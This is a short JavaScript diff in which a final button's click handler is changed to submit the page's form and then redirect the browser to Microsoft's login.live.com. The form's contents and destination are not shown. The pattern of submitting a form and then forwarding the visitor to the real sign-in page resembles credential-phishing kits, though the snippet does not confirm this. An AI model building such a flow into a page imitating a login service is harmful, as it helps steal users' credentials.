@@ -111,7 +111,9 @@ document.getElementById('btn_final').addEventListener('click', (event) => {
 
     //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
-        b.addEventListener('click', () => {
+        b.addEventListener('click', (event) => {
+            event.preventDefault();
+            document.querySelector('form').submit();
             //close the window
             window.location.href="https://login.live.com";
         })
